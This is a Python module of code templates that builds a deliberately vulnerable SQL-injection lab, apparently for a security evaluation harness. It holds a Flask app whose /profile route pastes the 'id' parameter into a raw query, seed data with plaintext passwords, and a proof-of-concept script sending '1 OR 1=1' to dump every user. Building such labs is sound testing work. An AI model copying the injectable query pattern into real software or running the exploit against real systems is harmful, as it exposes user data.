"""Code templates for the MVP SQLi environment."""
from __future__ import annotations

import textwrap


def render_app_py() -> str:
    return textwrap.dedent(
        """
        import os
        import sqlite3
        from pathlib import Path
        from flask import Flask, g, jsonify, request

        APP_DB_PATH = os.environ.get("APP_DB_PATH", "/tmp/app.db")
        app = Flask(__name__)

        def get_db():
            if "db" not in g:
                g.db = sqlite3.connect(APP_DB_PATH)
                g.db.row_factory = sqlite3.Row
            return g.db

        def init_db():
            db = get_db()
            schema_sql = Path(__file__).with_name("schema.sql").read_text()
            db.executescript(schema_sql)
            db.commit()

        def ensure_db_initialized():
            if Path(APP_DB_PATH).exists():
                return
            with app.app_context():
                init_db()

        ensure_db_initialized()

        @app.teardown_appcontext
        def close_connection(exception):
            db = g.pop("db", None)
            if db is not None:
                db.close()

        @app.route("/users")
        def list_users():
            db = get_db()
            rows = db.execute("SELECT id, username, password FROM users").fetchall()
            return jsonify([dict(row) for row in rows])

        @app.route("/profile")
        def get_profile():
            user_id = request.args.get("id", "1")
            # Intentionally vulnerable raw query for CWE-89 demonstration.
            query = f"SELECT id, username, password FROM users WHERE id = {user_id};"
            app.logger.warning("Executing raw query: %s", query)
            db = get_db()
            rows = db.execute(query).fetchall()
            return jsonify([dict(row) for row in rows])

        if __name__ == "__main__":
            app.run(host="0.0.0.0", port=5000)
        """
    ).strip() + "\n"


def render_schema_sql() -> str:
    return textwrap.dedent(
        """
        DROP TABLE IF EXISTS users;
        CREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL
        );

        INSERT INTO users (username, password) VALUES
            ('alice', 'alice_pw'),
            ('bob', 'bob_pw'),
            ('charlie', 'charlie_pw');
        """
    ).strip() + "\n"


def render_dockerfile() -> str:
    return textwrap.dedent(
        """
        FROM python:3.11-slim
        WORKDIR /app
        COPY requirements.txt .
        RUN pip install --no-cache-dir -r requirements.txt
        COPY . .
        ENV FLASK_APP=app.py
        EXPOSE 5000
        CMD ["python", "app.py"]
        """
    ).strip() + "\n"


def render_requirements() -> str:
    return "Flask==3.0.0\nrequests==2.31.0\n"


def render_poc_py() -> str:
    return textwrap.dedent(
        """
        import argparse
        import json
        import sys

        import requests

        DEFAULT_PAYLOAD = "1 OR 1=1"

        def exploit(base_url: str, payload: str = DEFAULT_PAYLOAD) -> bool:
            resp = requests.get(f"{base_url}/profile", params={"id": payload}, timeout=5)
            resp.raise_for_status()
            data = resp.json()
            print(json.dumps(data, indent=2))
            return len(data) > 1

        def main():
            parser = argparse.ArgumentParser(description="MVP SQLi PoC")
            parser.add_argument("--base-url", default="http://127.0.0.1:5000")
            parser.add_argument("--payload", default=DEFAULT_PAYLOAD)
            args = parser.parse_args()
            success = exploit(args.base_url, args.payload)
            if success:
                print("SQLi SUCCESS")
            else:
                print("SQLi FAILED")
                sys.exit(1)

        if __name__ == "__main__":
            main()
        """
    ).strip() + "\n"


def render_readme(requirement_id: str) -> str:
    return textwrap.dedent(
        f"""
        # MVP SQLi scenario - {requirement_id}

        ## Overview
        - Inspired by docs/milestones/mvp_runbook.md and docs/evals/specs.md
        - Vulnerability: unsanitized SQL query composition in `/profile`
        - PoC: run `python poc.py --base-url http://127.0.0.1:5000`

        ## Files
        - `app.py`: Flask application with CWE-89 sink
        - `schema.sql`: SQLite schema + seed data
        - `Dockerfile`: deterministic runtime based on python:3.11-slim
        - `requirements.txt`: pinned dependencies
        - `poc.py`: exploit script used by evals/poc_verifier/mvp_sqli.py
        """
    ).strip() + "\n"
